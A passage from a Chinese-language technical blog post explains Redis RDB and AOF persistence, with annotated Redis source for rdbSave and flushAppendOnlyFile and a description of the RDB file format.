class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * 将数据库保存到磁盘上。</span></span><br><span class="line"><span class="comment"> * 保存成功返回 REDIS_OK ，出错/失败返回 REDIS_ERR 。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">rdbSave</span><span class="params">(<span class="type">char</span> *filename)</span> </span>&#123;</span><br><span class="line">    dictIterator *di = <span class="literal">NULL</span>;</span><br><span class="line">    dictEntry *de;</span><br><span class="line">    <span class="type">char</span> tmpfile[<span class="number">256</span>];</span><br><span class="line">    <span class="type">char</span> magic[<span class="number">10</span>];</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> now = <span class="built_in">mstime</span>();</span><br><span class="line">    FILE *fp;</span><br><span class="line">    rio rdb;</span><br><span class="line">    <span class="type">uint64_t</span> cksum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建临时文件</span></span><br><span class="line">    <span class="built_in">snprintf</span>(tmpfile,<span class="number">256</span>,<span class="string">&quot;temp-%d.rdb&quot;</span>, (<span class="type">int</span>) <span class="built_in">getpid</span>());</span><br><span class="line">    fp = <span class="built_in">fopen</span>(tmpfile,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) &#123;</span><br><span class="line">        <span class="built_in">redisLog</span>(REDIS_WARNING, <span class="string">&quot;Failed opening .rdb for saving: %s&quot;</span>,</span><br><span class="line">            <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span> REDIS_ERR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 I/O</span></span><br><span class="line">    <span class="built_in">rioInitWithFile</span>(&amp;rdb,fp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置校验和函数</span></span><br><span class="line">    <span class="keyword">if</span> (server.rdb_checksum)</span><br><span class="line">        rdb.update_cksum = rioGenericUpdateChecksum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入 RDB 版本号</span></span><br><span class="line">    <span class="built_in">snprintf</span>(magic,<span class="built_in">sizeof</span>(magic),<span class="string">&quot;REDIS%04d&quot;</span>,REDIS_RDB_VERSION);</span><br><span class="line">    <span class="comment">// 写入错误，跳转到werr</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">rdbWriteRaw</span>(&amp;rdb,magic,<span class="number">9</span>) == <span class="number">-1</span>) <span class="keyword">goto</span> werr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历所有数据库</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; server.dbnum; j++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 指向数据库</span></span><br><span class="line">        redisDb *db = server.db+j;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 指向数据库键空间</span></span><br><span class="line">        dict *d = db-&gt;dict;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 跳过空数据库</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">dictSize</span>(d) == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建键空间迭代器</span></span><br><span class="line">        di = <span class="built_in">dictGetSafeIterator</span>(d);</span><br><span class="line">        <span class="keyword">if</span> (!di) &#123;</span><br><span class="line">            <span class="built_in">fclose</span>(fp);</span><br><span class="line">            <span class="keyword">return</span> REDIS_ERR;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">         * 写入 DB 选择器</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">rdbSaveType</span>(&amp;rdb,REDIS_RDB_OPCODE_SELECTDB) == <span class="number">-1</span>) <span class="keyword">goto</span> werr;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">rdbSaveLen</span>(&amp;rdb,j) == <span class="number">-1</span>) <span class="keyword">goto</span> werr;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 遍历数据库，并写入每个键值对的数据</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">while</span>((de = <span class="built_in">dictNext</span>(di)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            sds keystr = <span class="built_in">dictGetKey</span>(de);</span><br><span class="line">            robj key, *o = <span class="built_in">dictGetVal</span>(de);</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> expire;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 根据 keystr ，在栈中创建一个 key 对象</span></span><br><span class="line">            <span class="built_in">initStaticStringObject</span>(key,keystr);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取键的过期时间</span></span><br><span class="line">            expire = <span class="built_in">getExpire</span>(db,&amp;key);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 保存键值对数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">rdbSaveKeyValuePair</span>(&amp;rdb,&amp;key,o,expire,now) == <span class="number">-1</span>) <span class="keyword">goto</span> werr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">dictReleaseIterator</span>(di);</span><br><span class="line">    &#125;</span><br><span class="line">    di = <span class="literal">NULL</span>; <span class="comment">/* So that we don&#x27;t release it again on error. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 写入 EOF 代码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">rdbSaveType</span>(&amp;rdb,REDIS_RDB_OPCODE_EOF) == <span class="number">-1</span>) <span class="keyword">goto</span> werr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * CRC64 校验和。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 如果校验和功能已关闭，那么 rdb.cksum 将为 0 ，</span></span><br><span class="line"><span class="comment">     * 在这种情况下， RDB 载入时会跳过校验和检查。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    cksum = rdb.cksum;</span><br><span class="line">    <span class="built_in">memrev64ifbe</span>(&amp;cksum);</span><br><span class="line">    <span class="built_in">rioWrite</span>(&amp;rdb,&amp;cksum,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 冲洗缓存，确保数据已写入磁盘</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fflush</span>(fp) == EOF) <span class="keyword">goto</span> werr;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fsync</span>(<span class="built_in">fileno</span>(fp)) == <span class="number">-1</span>) <span class="keyword">goto</span> werr;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fclose</span>(fp) == EOF) <span class="keyword">goto</span> werr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 使用 RENAME ，原子性地对临时文件进行改名，覆盖原来的 RDB 文件。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">rename</span>(tmpfile,filename) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">redisLog</span>(REDIS_WARNING,<span class="string">&quot;Error moving temp DB file on the final destination: %s&quot;</span>, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="built_in">unlink</span>(tmpfile);</span><br><span class="line">        <span class="keyword">return</span> REDIS_ERR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入完成，打印日志</span></span><br><span class="line">    <span class="built_in">redisLog</span>(REDIS_NOTICE,<span class="string">&quot;DB saved on disk&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清零数据库脏状态</span></span><br><span class="line">    server.dirty = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录最后一次完成 SAVE 的时间</span></span><br><span class="line">    server.lastsave = <span class="built_in">time</span>(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录最后一次执行 SAVE 的状态</span></span><br><span class="line">    server.lastbgsave_status = REDIS_OK;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> REDIS_OK;</span><br><span class="line"></span><br><span class="line">werr:</span><br><span class="line">    <span class="comment">// 关闭文件</span></span><br><span class="line">    <span class="built_in">fclose</span>(fp);</span><br><span class="line">    <span class="comment">// 删除文件</span></span><br><span class="line">    <span class="built_in">unlink</span>(tmpfile);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">redisLog</span>(REDIS_WARNING,<span class="string">&quot;Write error saving DB on disk: %s&quot;</span>, <span class="built_in">strerror</span>(errno));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (di) <span class="built_in">dictReleaseIterator</span>(di);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> REDIS_ERR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RDB文件内容"><a href="#RDB文件内容" class="headerlink" title="RDB文件内容"></a>RDB文件内容</h2><p>首先给出一个完整的RDB文件的格式</p><p><img src="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220416095614501.png" alt="image-20220416095614501"></p><p><strong>后续为描述方便，大写为常量，小写为变量或者数据</strong></p><ul><li><code>REDIS</code> 这个其实就是RDB文件的标识符</li><li><code>db_version</code>长度4字节，记录RDB文件的版本号，redis3.0一般使用0006（第六版）</li><li><code>databases</code>表示任意个数据库</li><li><code>EOF</code>表示正文内容结束</li><li><code>check_sum</code>校验和，8字节，通过前面4部分内容计算得出</li></ul><p>下面重点说下<code>databases</code>字段，每个<code>database</code>都是包括如下几个部分。</p><p><img src="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220416100056609.png" alt="image-20220416100056609"></p><ul><li><p><code>SELECTDB</code>一字节，表示接下来要读一个数据库号码</p></li><li><p><code>db_number</code>表示一个数据库号码，长度1、2、5字节，当读入该数字后，redis会调用<code>select</code>命令进行数据库切换</p></li><li><p><code>key_value_pairs</code>表示数据库中所有的键值对数据，其中又分为不带过期时间的键值对，和带过期时间的键值对</p><ul><li>不带过期的键值对，由<code>TYPE</code>、<code>key</code>、<code>value</code>组成</li></ul><p>  <img src="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220416100445186.png"></p><ul><li>带过期的键值对，由<code>EXPIRETIME_MS</code>、<code>ms</code>、<code>TYPE</code>、<code>key</code>、<code>value</code>组成</li></ul><p>  <img src="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220416100544203.png" alt="image-20220416100544203"></p></li></ul><h1 id="AOF持久化"><a href="#AOF持久化" class="headerlink" title="AOF持久化"></a>AOF持久化</h1><p>AOF持久化是通过保存redis服务器在运行期间所执行的<strong>写</strong>命令进行记录数据，AOF持久化分为命令追加、文件写入、文件同步三个步骤，下面分别对这三个步骤进行阐述</p><h2 id="命令追加"><a href="#命令追加" class="headerlink" title="命令追加"></a>命令追加</h2><p>当AOF持久化处于打开的状态，服务器在执行一个写命令之后，会以某种协议的方式将被执行的写命令追加到服务器<code>redisServer</code>中的aof_buf缓冲区末尾</p><h2 id="文件写入与同步"><a href="#文件写入与同步" class="headerlink" title="文件写入与同步"></a>文件写入与同步</h2><p>上一次我们说到，redis在运行过程中，是一个事件循环，每次循环执行对应的时间事件和文件事件，因此AOF持久化的写入也在每次事件循环结束后进行，执行函数<code>flushAppendOnlyFile</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">flushAppendOnlyFile</span><span class="params">(<span class="type">int</span> force)</span> </span>&#123;</span><br><span class="line">    <span class="type">ssize_t</span> nwritten;</span><br><span class="line">    <span class="type">int</span> sync_in_progress = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 缓冲区中没有任何内容，直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sdslen</span>(server.aof_buf) == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 策略为每秒 FSYNC </span></span><br><span class="line">    <span class="keyword">if</span> (server.aof_fsync == AOF_FSYNC_EVERYSEC)</span><br><span class="line">        <span class="comment">// 是否有 SYNC 正在后台进行？</span></span><br><span class="line">        sync_in_progress = <span class="built_in">bioPendingJobsOfType</span>(REDIS_BIO_AOF_FSYNC) != <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 每秒 fsync ，并且强制写入为假</span></span><br><span class="line">    <span class="keyword">if</span> (server.aof_fsync == AOF_FSYNC_EVERYSEC &amp;&amp; !force) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">         * 当 fsync 策略为每秒钟一次时， fsync 在后台执行。</span></span><br><span class="line"><span class="comment">         * 如果后台仍在执行 FSYNC ，那么我们可以延迟写操作一两秒</span></span><br><span class="line"><span class="comment">         * （如果强制执行 write 的话，服务器主线程将阻塞在 write 上面）</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (sync_in_progress) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 有 fsync 正在后台进行 。。。</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (server.aof_flush_postponed_start == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * 前面没有推迟过 write 操作，这里将推迟写操作的时间记录下来</span></span><br><span class="line"><span class="comment">                 * 然后就返回，不执行 write 或者 fsync</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                server.aof_flush_postponed_start = server.unixtime;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (server.unixtime - server.aof_flush_postponed_start &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="comment">/* </span></span><br><span class="line"><span class="comment">                 * 如果之前已经因为 fsync 而推迟了 write 操作</span></span><br><span class="line"><span class="comment">                 * 但是推迟的时间不超过 2 秒，那么直接返回</span></span><br><span class="line"><span class="comment">                 * 不执行 write 或者 fsync</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 如果后台还有 fsync 在执行，并且 write 已经推迟 &gt;= 2 秒</span></span><br><span class="line"><span class="comment">             * 那么执行写操作（write 将被阻塞）</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            server.aof_delayed_fsync++;</span><br><span class="line">            <span class="built_in">redisLog</span>(REDIS_NOTICE,<span class="string">&quot;Asynchronous AOF fsync is taking too long (disk is busy?). Writing the AOF buffer without waiting for fsync to complete, this may slow down Redis.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 执行到这里，程序会对 AOF 文件进行写入。</span></span><br><span class="line"><span class="comment">     * 清零延迟 write 的时间记录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    server.aof_flush_postponed_start = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 执行单个 write 操作，如果写入设备是物理的话，那么这个操作应该是原子的</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 当然，如果出现像电源中断这样的不可抗现象，那么 AOF 文件也是可能会出现问题的</span></span><br><span class="line"><span class="comment">     * 这时就要用 redis-check-aof 程序来进行修复。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    nwritten = <span class="built_in">write</span>(server.aof_fd,server.aof_buf,<span class="built_in">sdslen</span>(server.aof_buf));</span><br><span class="line">    <span class="keyword">if</span> (nwritten != (<span class="type">signed</span>)<span class="built_in">sdslen</span>(server.aof_buf)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">static</span> <span class="type">time_t</span> last_write_error_log = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> can_log = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将日志的记录频率限制在每行 AOF_WRITE_LOG_ERROR_RATE 秒</span></span><br><span class="line">        <span class="keyword">if</span> ((server.unixtime - last_write_error_log) &gt; AOF_WRITE_LOG_ERROR_RATE) &#123;</span><br><span class="line">            can_log = <span class="number">1</span>;</span><br><span class="line">            last_write_error_log = server.unixtime;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果写入出错，那么尝试将该情况写入到日志里面</span></span><br><span class="line">        <span class="keyword">if</span> (nwritten == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (can_log) &#123;</span><br><span class="line">                <span class="built_in">redisLog</span>(REDIS_WARNING,<span class="string">&quot;Error writing to the AOF file: %s&quot;</span>,</span><br><span class="line">                    <span class="built_in">strerror</span>(errno));</span><br><span class="line">                server.aof_last_write_errno = errno;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (can_log) &#123;</span><br><span class="line">                <span class="built_in">redisLog</span>(REDIS_WARNING,<span class="string">&quot;Short write while writing to &quot;</span></span><br><span class="line">                                       <span class="string">&quot;the AOF file: (nwritten=%lld, &quot;</span></span><br><span class="line">                                       <span class="string">&quot;expected=%lld)&quot;</span>,</span><br><span class="line">                                       (<span class="type">long</span> <span class="type">long</span>)nwritten,</span><br><span class="line">                                       (<span class="type">long</span> <span class="type">long</span>)<span class="built_in">sdslen</span>(server.aof_buf));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 尝试移除新追加的不完整内容</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">ftruncate</span>(server.aof_fd, server.aof_current_size) == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (can_log) &#123;</span><br><span class="line">                    <span class="built_in">redisLog</span>(REDIS_WARNING, <span class="string">&quot;Could not remove short write &quot;</span></span><br><span class="line">                             <span class="string">&quot;from the append-only file.  Redis may refuse &quot;</span></span><br><span class="line">                             <span class="string">&quot;to load the AOF the next time it starts.  &quot;</span></span><br><span class="line">                             <span class="string">&quot;ftruncate: %s&quot;</span>, <span class="built_in">strerror</span>(errno));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* If the ftrunacate() succeeded we can set nwritten to</span></span><br><span class="line"><span class="comment">                 * -1 since there is no longer partial data into the AOF. */</span></span><br><span class="line">                nwritten = <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            server.aof_last_write_errno = ENOSPC;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理写入 AOF 文件时出现的错误</span></span><br><span class="line">        <span class="keyword">if</span> (server.aof_fsync == AOF_FSYNC_ALWAYS) &#123;</span><br><span class="line">            <span class="comment">/* We can&#x27;t recover when the fsync policy is ALWAYS since the</span></span><br><span class="line"><span class="comment">             * reply for the client is already in the output buffers, and we</span></span><br><span class="line"><span class="comment">             * have the contract with the user that on acknowledged write data</span></span><br><span class="line"><span class="comment">             * is synched on disk. */</span></span><br><span class="line">            <span class="built_in">redisLog</span>(REDIS_WARNING,<span class="string">&quot;Can&#x27;t recover from AOF write error when the AOF fsync policy is &#x27;always&#x27;. Exiting...&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* Recover from failed write leaving data into the buffer. However</span></span><br><span class="line"><span class="comment">             * set an error to stop accepting writes as long as the error</span></span><br><span class="line"><span class="comment">             * condition is not cleared. */</span></span><br><span class="line">            server.aof_last_write_status = REDIS_ERR;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Trim the sds buffer if there was a partial write, and there</span></span><br><span class="line"><span class="comment">             * was no way to undo it with ftruncate(2). */</span></span><br><span class="line">            <span class="keyword">if</span> (nwritten &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                server.aof_current_size += nwritten;</span><br><span class="line">                <span class="built_in">sdsrange</span>(server.aof_buf,nwritten,<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>; <span class="comment">/* We&#x27;ll try again on the next call... */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 写入成功，更新最后写入状态</span></span><br><span class="line">        <span class="keyword">if</span> (server.aof_last_write_status == REDIS_ERR) &#123;</span><br><span class="line">            <span class="built_in">redisLog</span>(REDIS_WARNING,</span><br><span class="line">                <span class="string">&quot;AOF write error looks solved, Redis can write again.&quot;</span>);</span><br><span class="line">            server.aof_last_write_status = REDIS_OK;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新写入后的 AOF 文件大小</span></span><br><span class="line">    server.aof_current_size += nwritten;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 如果 AOF 缓存的大小足够小的话，那么重用这个缓存，</span></span><br><span class="line"><span class="comment">     * 否则的话，释放 AOF 缓存。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">sdslen</span>(server.aof_buf)+<span class="built_in">sdsavail</span>(server.aof_buf)) &lt; <span class="number">4000</span>) &#123;</span><br><span class="line">        <span class="comment">// 清空缓存中的内容，等待重用</span></span><br><span class="line">        <span class="built_in">sdsclear</span>(server.aof_buf);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 释放缓存</span></span><br><span class="line">        <span class="built_in">sdsfree</span>(server.aof_buf);</span><br><span class="line">        server.aof_buf = <span class="built_in">sdsempty</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果 no-appendfsync-on-rewrite 选项为开启状态，</span></span><br><span class="line"><span class="comment">     * 并且有 BGSAVE 或者 BGREWRITEAOF 正在进行的话，</span></span><br><span class="line"><span class="comment">     * 那么不执行 fsync </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (server.aof_no_fsync_on_rewrite &amp;&amp;</span><br><span class="line">        (server.aof_child_pid != <span class="number">-1</span> || server.rdb_child_pid != <span class="number">-1</span>))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 总是执行 fsnyc</span></span><br><span class="line">    <span class="keyword">if</span> (server.aof_fsync == 